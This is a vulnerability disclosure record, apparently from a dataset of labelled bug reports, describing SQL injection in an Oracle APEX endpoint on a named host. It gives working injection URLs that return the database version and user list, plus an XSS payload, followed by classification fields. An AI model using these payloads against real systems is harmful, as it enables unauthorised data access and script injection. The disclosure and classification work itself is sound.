title: [ipm.informatica.com] Sql injection Oracle
content:
Hi host ipm.informatica.com is vulnerable to sql injection attacks the web application does not produce sufficient validation on user input.
POC
detection
request 1
http://ipm.informatica.com/pls/apex/f?1'=1 response 500 HTTP/1.1 500 Internal Server Error
request 2
http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found
exploitation
http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version
Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release 11.2.0.3.0 - Production CORE 11.2.0.3.0
Production TNS for Linux: Version 11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production
Cross Site Scripting via sql injection

and etc
http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS
steps: Send a request to http://ipm.informatica.com/pls/apex/f?1'=1 and observe a 500 Internal Server Error response.
Send a request to http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version to retrieve database version information.
Send a request to http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')> to execute a Cross-Site Scripting (XSS) attack.
Send a request to http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS to retrieve usernames from the database.
vuln_description: The web application at ipm.informatica.com is vulnerable to SQL injection attacks due to insufficient validation of user input. This allows an attacker to execute arbitrary SQL queries, retrieve sensitive database information, and perform Cross-Site Scripting (XSS) attacks via SQL injection.
reason: The vulnerability involves straightforward SQL injection techniques without requiring complex application state manipulation or novel logic. The attack components are standard for SQL injection vulnerabilities and do not involve subtle interactions or multiple complex steps.

authnz_metadata.reason: The SQL injection vulnerability involves direct manipulation of database queries through user input without proper validation, which is a different class of vulnerability from the AuthN/AuthZ bypass or IDOR vulnerabilities described in the methodology. The methodology focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on input validation flaws that lead to SQL injection.
